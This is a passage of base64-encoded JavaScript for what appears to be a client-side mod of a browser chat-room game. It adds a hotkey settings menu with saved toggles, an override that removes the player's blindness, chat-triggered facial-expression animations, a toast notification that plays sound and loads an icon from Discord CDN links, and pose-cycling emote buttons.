ZXIiLCBmdW5jdGlvbigpIHsKICBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkIjsKICBvcHRpb24zLnN0eWxlLmN1cnNvciA9ICJwb2ludGVyIjsKfSk7CgpvcHRpb24zLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlbGVhdmUiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgIG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImxpZ2h0Z3JlZW4iOwogIH0gZWxzZSB7CiAgICBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKLy8gQ2hlY2tib3ggc3RhdGUgd2hlbiB0aGUgcGFnZSBsb2FkcwpjaGVja2JveDEuY2hlY2tlZCA/IG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiIDogb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CmNoZWNrYm94Mi5jaGVja2VkID8gb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCIgOiBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKY2hlY2tib3gzLmNoZWNrZWQgPyBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IiA6IG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwoKCi8vIENoYW5nZSBsYWJlbCBiYWNrZ3JvdW5kIGNvbG9yIHdoZW4gdGhlIGNoZWNrYm94IGlzIGNoZWNrZWQKY2hlY2tib3gxLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGlmIChjaGVja2JveDEuY2hlY2tlZCkgewogICAgb3B0aW9uMS5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2QxZjdjNCI7CiAgfSBlbHNlIHsKICAgIG9wdGlvbjEuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNmMmYyZjIiOwogIH0KfSk7CgpjaGVja2JveDIuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgaWYgKGNoZWNrYm94Mi5jaGVja2VkKSB7CiAgICBvcHRpb24yLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZDFmN2M0IjsKICB9IGVsc2UgewogICAgb3B0aW9uMi5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2YyZjJmMiI7CiAgfQp9KTsKCmNoZWNrYm94My5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBpZiAoY2hlY2tib3gzLmNoZWNrZWQpIHsKICAgIG9wdGlvbjMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkMWY3YzQiOwogIH0gZWxzZSB7CiAgICBvcHRpb24zLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZjJmMmYyIjsKICB9Cn0pOwoKLy9PcHRpb25zIEFjdGlvbnNfX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKZnVuY3Rpb24gcnVuT3B0aW9uMSgpIHsKICAgIGlmIChjaGVja2JveDEuY2hlY2tlZCkgewogICAgICBmdW5jdGlvbiBHZXRCbGluZExldmVsMCgpIHsKICAgICAgICBsZXQgYmxpbmRMZXZlbCA9IDA7CiAgICAgICAgcmV0dXJuIGJsaW5kTGV2ZWw7CiAgICAgIH0KICAgICAgUGxheWVyLkdldEJsaW5kTGV2ZWwgPSBHZXRCbGluZExldmVsMDsKICAgICAgUGxheWVyLkdldEJsaW5kTGV2ZWwoKTsKICAgIH0KICB9CiAgCiAgZnVuY3Rpb24gcnVuT3B0aW9uMigpIHsKICAgIGZ1bmN0aW9uIFJ1bkV4cHJlc3Npb25BbmltYXRpb25TdGVwKCkgewogICAgICBDaGFyYWN0ZXJTZXRGYWNpYWxFeHByZXNzaW9uKFBsYXllciwgIk1vdXRoIiwgZXhwcmVzc2lvbkFuaW1hdGlvbltleHByZXNzaW9uQW5pbWF0aW9uSW5kZXgrK10pOwogICAgICBpZiAoZXhwcmVzc2lvbkFuaW1hdGlvbkluZGV4IDwgZXhwcmVzc2lvbkFuaW1hdGlvbi5sZW5ndGgpIHsKICAgICAgICBzZXRUaW1lb3V0KFJ1bkV4cHJlc3Npb25BbmltYXRpb25TdGVwLCAxMDAwKTsKICAgICAgfSBlbHNlIHsKICAgICAgICBleHByZXNzaW9uQW5pbWF0aW9uID0gbnVsbDsKICAgICAgfQogICAgfQogIAogICAgZnVuY3Rpb24gUnVuRXhwcmVzc2lvbkFuaW1hdGlvbihsaXN0KSB7CiAgICAgIGlmIChleHByZXNzaW9uQW5pbWF0aW9uKSB7CiAgICAgICAgcmV0dXJuOwogICAgICB9CiAgICAgIGV4cHJlc3Npb25BbmltYXRpb24gPSBsaXN0OwogICAgICBleHByZXNzaW9uQW5pbWF0aW9uSW5kZXggPSAwOwogICAgICBleHByZXNzaW9uQW5pbWF0aW9uRXggPSBJbnZlbnRvcnlHZXQoUGxheWVyLCAiTW91dGgiKTsKICAgICAgaWYgKGV4cHJlc3Npb25BbmltYXRpb25FeCAmJiBleHByZXNzaW9uQW5pbWF0aW9uRXguUHJvcGVydHkgJiYgZXhwcmVzc2lvbkFuaW1hdGlvbkV4LlByb3BlcnR5LkV4cHJlc3Npb24pIHsKICAgICAgICBleHByZXNzaW9uQW5pbWF0aW9uW2V4cHJlc3Npb25BbmltYXRpb24ubGVuZ3RoIC0gMV0gPSBleHByZXNzaW9uQW5pbWF0aW9uRXguUHJvcGVydHkuRXhwcmVzc2lvbjsgLy9zZXQgbGFzdCB0byBjdXJyZW50CiAgICAgIH0KICAgICAgUnVuRXhwcmVzc2lvbkFuaW1hdGlvblN0ZXAoKTsKICAgIH0KICAKICAgIGZ1bmN0aW9uIE5FV3RhbGtpbmcoKSB7CiAgICAgIHZhciBtc2cgPSBFbGVtZW50VmFsdWUoIklucHV0Q2hhdCIpLnRyaW0oKTsKICAgICAgaWYgKCFtc2cuc3RhcnRzV2l0aCgiLyIpICYmICFtc2cuc3RhcnRzV2l0aCgiKiIpICYmICFtc2cuc3RhcnRzV2l0aCgiISIpKSB7CiAgICAgICAgaWYgKG1zZy5sZW5ndGggPiAxMCkgewogICAgICAgICAgUnVuRXhwcmVzc2lvbkFuaW1hdGlvbihbbnVsbCwgIkdyaW4iLCAiU21pcmsiLCBudWxsLCAiR3JpbiIsICJTbWlyayIsIG51bGxdKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgUnVuRXhwcmVzc2lvbkFuaW1hdGlvbihbbnVsbCwgIkdyaW4iLCAiU21pcmsiLCBudWxsXSk7CiAgICAgICAgfQogICAgICB9CiAgICAgIE9MRHRhbGtpbmcoKTsKICAgIH0KICAKICAgIGlmIChjaGVja2JveDIuY2hlY2tlZCkgewogICAgICB2YXIgZXhwcmVzc2lvbkFuaW1hdGlvbjsKICAgICAgdmFyIGV4cHJlc3Npb25BbmltYXRpb25JbmRleCA9IDA7CiAgICAgIHZhciBPTER0YWxraW5nID0gQ2hhdFJvb21TZW5kQ2hhdDsKICAgICAgQ2hhdFJvb21TZW5kQ2hhdCA9IE5FV3RhbGtpbmc7CiAgICB9CiAgfQoKICBmdW5jdGlvbiBydW5PcHRpb24zKCkgewogICAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICAgIGZ1bmN0aW9uIHNob3dUb2FzdHNjcGcoKSB7CiAgICAgICAgQXVkaW9QbGF5SW5zdGFudFNvdW5kKCJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA5MDUzMDQ3OTA4MzYzMDY3Mi9oNDJ2d2NkLW5vdGlmaWNhdGlvbi0xX3ZNcWhWbHRTLm1wMyIsIDEpOwogICAgICAgIC8vIENyZWF0ZSB0aGUgdG9hc3QgY29udGFpbmVyCiAgICAgICAgdmFyIHRvYXN0Q29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUucG9zaXRpb24gPSAiZml4ZWQiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmJvdHRvbSA9ICI1cHgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLnJpZ2h0ID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIndoaXRlIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5jb2xvciA9ICIjMTQxNDE0IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5wYWRkaW5nID0gIjVweCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuYm9yZGVyID0gIjJweCBzb2xpZCAjNENBRjUwIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNXB4IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5ib3hTaGFkb3cgPSAiMnB4IDJweCAxMHB4IHJnYmEoMCwgMCwgMCwgMC41KSI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS56SW5kZXggPSAiOTk5IjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS50cmFuc2l0aW9uID0gIm9wYWNpdHkgMC41cyBlYXNlLWluLW91dCI7CiAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKICAgICAgICB2YXIgc3RhdHVzQmFyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICBzdGF0dXNCYXIuc3R5bGUuaGVpZ2h0ID0gIjNweCI7CiAgICBzdGF0dXNCYXIuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gImJsYWNrIjsKICAgIHN0YXR1c0Jhci5zdHlsZS5wb3NpdGlvbiA9ICJhYnNvbHV0ZSI7CiAgICBzdGF0dXNCYXIuc3R5bGUuYm90dG9tID0gIjAiOwogICAgc3RhdHVzQmFyLnN0eWxlLmxlZnQgPSAiMCI7CiAgICBzdGF0dXNCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICJ3aWR0aCA1cyBlYXNlLWluLW91dCI7CiAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMCUiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoc3RhdHVzQmFyKTsKICAgIAogICAgLy8gU3RhdHVzIGJhciB3aWR0aCB3aGlsZSBjb3VudGluZyBkb3duCiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICBzdGF0dXNCYXIuc3R5bGUud2lkdGggPSAiMTAwJSI7CiAgICB9LCAwKTsKICAgIHZhciBpY29uID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7CiAgICBpY29uLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwogICAgaWNvbi5zdHlsZS53aWR0aCA9ICIyM3B4IjsKICAgIGljb24uc3R5bGUuaGVpZ2h0ID0gIjIzcHgiOwogICAgaWNvbi5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiNTAlIjsKICAgIGljb24uc3R5bGUubWFyZ2luUmlnaHQgPSAiLTMwcHgiOwogICAgaWNvbi5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiLTVweCI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZChpY29uKTsKICAgIHZhciB0ZXh0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3BhbiIpOwogICAgdGV4dC5zdHlsZS5mb250V2VpZ2h0ID0gImJvbGQiOwogICAgdGV4dC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjM1cHgiOwogICAgdGV4dC5pbm5lckhUTUwgPSAiQWN0aW9uIFN1Y2Nlc3NmdWxseSBFeGVjdXRlZCI7CiAgICB0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZCh0ZXh0KTsKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3RDb250YWluZXIpOwogICAgICAKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjEiOwogICAgICAgIH0sIDApOwogICAgICAKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICAgICAgICB9LCA1MDAwKTsKICAgICAgCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgICAgfSwgNTUwMCk7CiAgICAgICAgc2VuZEZkZWJ1ZygpOwogICAgCiAgICAgIH0KCiAgICB9CiAgfQoKICAvLyBMb2FkIGNoZWNrYm94IHN0YXRlcyBmcm9tIGxvY2FsIHN0b3JhZ2UKICBpZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oIm9wdGlvbjEiKSAhPT0gbnVsbCkgewogICAgY2hlY2tib3gxLmNoZWNrZWQgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMSIpID09PSAidHJ1ZSI7CiAgICBpZiAoY2hlY2tib3gxLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMSwgMTAwMCk7CiAgICB9CiAgfQogIAogIGlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMiIpICE9PSBudWxsKSB7CiAgICBjaGVja2JveDIuY2hlY2tlZCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24yIikgPT09ICJ0cnVlIjsKICAgIGlmIChjaGVja2JveDIuY2hlY2tlZCkgewogICAgICBzZXRJbnRlcnZhbChydW5PcHRpb24yLCAxMDAwKTsKICAgIH0KICB9CgogIGlmIChsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgib3B0aW9uMyIpICE9PSBudWxsKSB7CiAgICBjaGVja2JveDMuY2hlY2tlZCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJvcHRpb24zIikgPT09ICJ0cnVlIjsKICAgIGlmIChjaGVja2JveDMuY2hlY2tlZCkgewogICAgICBzZXRJbnRlcnZhbChydW5PcHRpb24zLCAxMDAwKTsKICAgIH0KICB9CiAgCiAgY2hlY2tib3gxLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjEiLCBjaGVja2JveDEuY2hlY2tlZCk7CiAgICBpZiAoY2hlY2tib3gxLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMSwgMTAwMCk7CiAgICB9CiAgfSk7CiAgCiAgY2hlY2tib3gyLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogICAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjIiLCBjaGVja2JveDIuY2hlY2tlZCk7CiAgICBpZiAoY2hlY2tib3gyLmNoZWNrZWQpIHsKICAgICAgc2V0SW50ZXJ2YWwocnVuT3B0aW9uMiwgMTAwMCk7CiAgICB9CiAgfSk7CgogIGNoZWNrYm94My5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24zIiwgY2hlY2tib3gzLmNoZWNrZWQpOwogICAgaWYgKGNoZWNrYm94My5jaGVja2VkKSB7CiAgICAgIHNldEludGVydmFsKHJ1bk9wdGlvbjMsIDEwMDApOwogICAgfQogIH0pOwogIAoKLy9PcHRpb25zIFN0YXRlc19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgovLyBTYXZlIGNoZWNrYm94IHN0YXRlcyB0byBsb2NhbCBzdG9yYWdlIApjaGVja2JveDEuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgbG9jYWxTdG9yYWdlLnNldEl0ZW0oIm9wdGlvbjEiLCBjaGVja2JveDEuY2hlY2tlZCk7Cn0pOwoKY2hlY2tib3gyLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIGZ1bmN0aW9uKCkgewogIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJvcHRpb24yIiwgY2hlY2tib3gyLmNoZWNrZWQpOwp9KTsKCmNoZWNrYm94My5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCBmdW5jdGlvbigpIHsKICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgib3B0aW9uMyIsIGNoZWNrYm94My5jaGVja2VkKTsKfSk7CgoKZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzZXR0aW5nc01lbnUpOwoKbGV0IGlzQmFja3RpY2tQcmVzc2VkID0gZmFsc2U7CmxldCBpc1NQcmVzc2VkID0gZmFsc2U7Cgpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgZnVuY3Rpb24oZXZlbnQpIHsKICBpZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICAgIGlzQmFja3RpY2tQcmVzc2VkID0gdHJ1ZTsKICB9IGVsc2UgaWYgKGV2ZW50LmtleSA9PT0gInMiKSB7CiAgICBpc1NQcmVzc2VkID0gdHJ1ZTsKICB9CgogIGlmIChpc0JhY2t0aWNrUHJlc3NlZCAmJiBpc1NQcmVzc2VkKSB7CiAgICBzZXR0aW5nc01lbnUuc3R5bGUuZGlzcGxheSA9ICJibG9jayI7CiAgfQp9KTsKCi8vIEhpZGUgc2V0dGluZ3MgbWVudSB3aGVuIHRoZSB1c2VyIGNsaWNrcyBvZmYKZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihldmVudCkgewogICAgY29uc3QgdGFyZ2V0RWxlbWVudCA9IGV2ZW50LnRhcmdldDsKICAgIGNvbnN0IGlzU2V0dGluZ3NNZW51ID0gISF0YXJnZXRFbGVtZW50LmNsb3Nlc3QoIiNzZXR0aW5ncy1tZW51Iik7CiAgICAKICAgIGlmICghaXNTZXR0aW5nc01lbnUpIHsKICAgICAgc2V0dGluZ3NNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICB9CiAgfSk7CiAgCiAgCgogIAoKLy8gQ2xlYXIgZmxhZ3Mgd2hlbiB0aGUgdXNlciByZWxlYXNlcyBlaXRoZXIga2V5CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImtleXVwIiwgZnVuY3Rpb24oZXZlbnQpIHsKICBpZiAoZXZlbnQua2V5ID09PSAiYCIpIHsKICAgIGlzQmFja3RpY2tQcmVzc2VkID0gZmFsc2U7CiAgfSBlbHNlIGlmIChldmVudC5rZXkgPT09ICJzIikgewogICAgaXNTUHJlc3NlZCA9IGZhbHNlOwogIH0KfSk7CgoKLy9FbmQgb2YgUGVyc2lzdGFudCBNZW51IF9fX19fX19fX19fX19fX19fX19fXwoKLy9TdGFydCBvZiBFbW90ZSBNZW51IF9fX19fX19fX19fX19fX19fX19fXwoKY29uc3QgYnV0dG9uRGF0YSA9IFsKICB7IG5hbWU6ICJQdWxsLVVwcyIsIGFjdGlvbjogKCkgPT4gewogICAgICAgIHNob3dUb2FzdHNjcGcoKTsKICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJMZWdzT3BlbiIpOwogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIik7CiAgICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgICAgSGVpZ2h0OiAxMzAKICAgICAgICAgICAgfTsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCAxMDAwKTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc0Nsb3NlZCIpOwogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMjUwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgMjAwMCk7CiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKCiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc09wZW4iKTsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpCiAgICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgICAgSGVpZ2h0OiAxMzAKICAgICAgICAgICAgfTsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCAzMDAwKTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIllva2VkIik7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc0Nsb3NlZCIpOwogICAgICAgICAgICBJbnZlbnRvcnlHZXQoUGxheWVyLCAiRW1vdGljb24iKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodCA9IHsKICAgICAgICAgICAgICAgIEhlaWdodDogMjUwCiAgICAgICAgICAgIH07CiAgICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogICAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgICAgfSwgNDAwMCk7ICAgIAogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiTGVnc09wZW4iKTsKICAgICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJPdmVyVGhlSGVhZCIpCiAgICAgICAgICAgIEludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICAgICAgICAgICAgSGVpZ2h0OiAxMzAKICAgICAgICAgICAgfTsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCA1MDAwKTsKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgICAgICAgICAgIGRlbGV0ZSBJbnZlbnRvcnlHZXQoUGxheWVyLCAnRW1vdGljb24nKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodDsKICAgICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gJ0NoYXRSb29tJyA/CiAgICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgICB9LCA2MDAwKTsgICAgCn0gfSwKICB7IG5hbWU6ICJDaGVlciIsIGFjdGlvbjogKCkgPT4gewogICAgc2hvd1RvYXN0c2NwZygpOwogICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCBudWxsKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiWW9rZWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgMTAwMCk7CiAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICBDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgIk92ZXJUaGVIZWFkIik7CiAgICAgICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgICAgICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgICAgICAgICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIH0sIDIwMDApOwogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCAzMDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgICAgIENoYXJhY3RlclNldEFjdGl2ZVBvc2UoUGxheWVyLCAiT3ZlclRoZUhlYWQiKTsKICAgICAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICAgICAgICAgIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogICAgICAgICAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgfSwgNDAwMCk7ICAgIAogICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgQ2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsICJZb2tlZCIpOwogICAgICAgICAgQ3VycmVudFNjcmVlbiA9PT0gIkNoYXRSb29tIiA/CiAgICAgICAgICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgICAgICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICB9LCA1MDAwKTsKICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpIH